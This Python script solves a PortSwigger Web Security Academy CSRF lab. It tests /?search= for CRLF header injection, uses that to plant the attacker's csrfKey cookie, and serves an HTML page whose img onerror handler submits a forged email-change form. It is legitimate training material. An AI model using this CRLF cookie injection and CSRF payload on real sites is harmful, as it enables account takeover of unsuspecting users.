#!/usr/bin/env python3
"""
CSRF where token is tied to non-session cookie
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 05-token-tied-to-non-session-cookie.md

What this does:
    Logs in and records the session's own csrf token and csrfKey cookie, then
    runs detect_cookie_injection() -- CSRF.py's Layer 1 detector for this
    family of labs -- against /?search=, probing for a CRLF (%0d%0a) header
    injection that can smuggle an arbitrary Set-Cookie into the response. It
    is found here. craft_cookie_injection_payload()'s technique then combines
    a form carrying the attacker's own valid csrf token with an <img> tag
    pointed at the CRLF-injection URL that plants the attacker's csrfKey
    cookie into the victim's browser; the onerror handler (which fires
    because the search response is HTML, not an image) submits the form only
    after the cookie injection request has completed.

Usage:
    python 05-token-tied-to-non-session-cookie.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def _get_csrf(client: httpx.Client, path: str = "/my-account") -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'name=csrf\s+value=([^\s>]+)', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> bool:
    csrf = _get_csrf(client, "/login")
    r = client.post("/login", data={"csrf": csrf, "username": username, "password": password})
    return r.status_code < 400 and "Log out" in r.text


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def detect_cookie_injection(client: httpx.Client, base_url: str) -> str:
    """Probe /?search= for CRLF header injection; return a {COOKIE_NAME}/{COOKIE_VALUE} URL template."""
    test_cookie = "csrfTestCookie"
    test_value = "testValue123"
    crlf_url = (
        f"{base_url}/?search=x%0d%0aSet-Cookie:%20{test_cookie}={test_value}"
        "%3b%20SameSite=None"
    )
    r = client.get(crlf_url)
    for header_val in r.headers.get_list("set-cookie"):
        if test_cookie in header_val:
            return (
                f"{base_url}/?search=x%0d%0aSet-Cookie:%20"
                "{COOKIE_NAME}={COOKIE_VALUE}%3b%20SameSite=None"
            )
    return ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    if not _login(client):
        print("[-] Login as wiener:peter failed.")
        return

    csrf = _get_csrf(client, "/my-account")
    csrf_key = client.cookies.get("csrfKey", "")
    print(f"[*] csrfKey: {csrf_key[:8]}..., csrf: {csrf[:8]}...")

    injection_url = detect_cookie_injection(client, lab_url)
    print(f"[*] Cookie injection gadget: {'FOUND' if injection_url else 'NOT FOUND'}")
    if not injection_url:
        print("[-] No CRLF cookie-injection gadget found on /?search= for this instance.")
        return

    endpoint = f"{lab_url}/my-account/change-email"
    inject_url = injection_url.format(
        COOKIE_NAME="csrfKey",
        COOKIE_VALUE=urllib.parse.quote(csrf_key, safe=""),
    )

    html = (
        '<html><body>\n'
        f'<form action="{endpoint}" method="POST">\n'
        f'  <input type="hidden" name="csrf" value="{csrf}" />\n'
        '  <input type="hidden" name="email" value="hacker@evil-user.net" />\n'
        '</form>\n'
        f'<img src="{inject_url}" onerror="document.forms[0].submit()">\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print(f"[*] Technique: Cookie injection (csrfKey={csrf_key[:8]}...) via CRLF + matching token")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- victim's csrfKey was overwritten and the attacker's token accepted.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
